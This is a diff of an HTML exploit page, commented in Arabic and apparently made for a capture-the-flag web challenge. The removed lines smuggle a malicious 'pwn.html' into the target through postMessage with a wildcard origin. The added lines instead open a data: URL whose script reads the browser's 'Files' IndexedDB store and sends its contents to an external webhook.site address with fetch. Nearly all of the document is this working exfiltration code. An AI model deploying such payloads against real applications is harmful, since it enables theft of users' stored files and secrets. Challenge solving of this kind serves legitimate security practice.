@@ -1,71 +1,42 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Uploading malicious HTML file to the main application...</h1>
     <script>
-        // 1. خادم المهاجم لتلقي العلم
         const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
-
-        // 2. الكود الخبيث الذي سيتم حقنه داخل ملف HTML.
-        // هذا الكود سيعمل من أصل (Origin) صفحة التحدي نفسها.
-        const malicious_script = `
-            <script>
-                (async () => {
-                    // نستخدم نفس كود استخراج IndexedDB الموثوق به
-                    try {
-                        const dbreq = indexedDB.open('Files', 1);
-                        dbreq.onsuccess = () => {
-                            const db = dbreq.result;
-                            const tx = db.transaction('files', 'readonly');
-                            const store = tx.objectStore('files');
-                            const req = store.getAll();
-                            req.onsuccess = (e) => {
-                                // العلم هو أول ملف يضيفه البوت وهو ليس ملفنا
-                                const flagObject = e.target.result.find(o => o.file.name !== 'pwn.html' && o.file.type === 'text/plain');
-                                if (flagObject) {
-                                    flagObject.file.text().then(flag => {
-                                        // تم العثور على العلم، أرسله!
-                                        fetch('${ATTACKER_SERVER}?flag=' + encodeURIComponent(flag));
-                                    });
-                                }
-                            };
-                        };
-                    } catch(e) {
-                         fetch('${ATTACKER_SERVER}?error=' + encodeURIComponent(e.toString()));
+        
+        // كود الاستخراج المعتاد
+        const scriptContent = `
+            (async () => {
+                const r = indexedDB.open('Files'); // No version needed
+                r.onsuccess = () => {
+                    const db = r.result;
+                    // Check if object store exists
+                    if (!db.objectStoreNames.contains('files')) {
+                        fetch('${ATTACKER_SERVER}?error=no_store_in_data_uri');
+                        return;
                     }
-                })();
-            <\/script>
-            <h1>PWNED!</h1>
+                    const tx = db.transaction('files', 'readonly');
+                    const store = tx.objectStore('files');
+                    const req = store.getAll();
+                    req.onsuccess = e => {
+                        const fileObj = e.target.result.find(o => o.file && o.file.type === 'text/plain');
+                        if (fileObj) {
+                            fileObj.file.text().then(flag => fetch('${ATTACKER_SERVER}?flag=' + encodeURIComponent(flag)));
+                        } else {
+                            fetch('${ATTACKER_SERVER}?error=flag_not_found');
+                        }
+                    };
+                    req.onerror = () => fetch('${ATTACKER_SERVER}?error=getall_failed');
+                };
+                r.onerror = () => fetch('${ATTACKER_SERVER}?error=dbopen_failed');
+            })();
         `;
-
-        // 3. بناء الرسالة التي سيتم إرسالها إلى الصفحة الرئيسية
-        const messagePayload = {
-            type: "share",
-            files: [{
-                // نحول كودنا الخبيث إلى Blob من نوع HTML
-                blob: new Blob([malicious_script], { type: "text/html" }),
-                cached: false, // مهم جدًا
-                name: "pwn.html", // نعطيه اسمًا يوحي بأنه ملف HTML
-                isPublic: true // لكي يظهر للجميع فورًا
-            }]
-        };
-
-        // 4. إرسال الرسالة
-        // لا نعرف بالضبط كيف يتم ترتيب النوافذ، لذلك سنحاول عدة طرق
-        // الطريقة الأكثر ترجيحًا هي أن صفحتنا يتم فتحها عبر window.open
-        // وبالتالي فإن صفحة التحدي هي window.opener
-        try {
-            if (window.opener) {
-                // نرسل الرسالة إلى النافذة التي فتحتنا
-                window.opener.postMessage(messagePayload, "*");
-            } else {
-                 // كحل بديل، نحاول الإرسال إلى النافذة الأصل (إذا كنا في iframe)
-                 window.parent.postMessage(messagePayload, "*");
-            }
-        } catch(e) {
-            // قد يحدث خطأ في الوصول إذا كانت الأصول مختلفة، ولكن postMessage يجب أن يعمل
-        }
-
+        
+        // إنشاء رابط بيانات يحتوي على صفحة كاملة تنفذ الكود
+        const dataUrl = 'data:text/html,<script>' + encodeURIComponent(scriptContent) + '<\/script>';
+        
+        // التنقل إليه
+        window.location = dataUrl;
     </script>
 </body>
 </html>
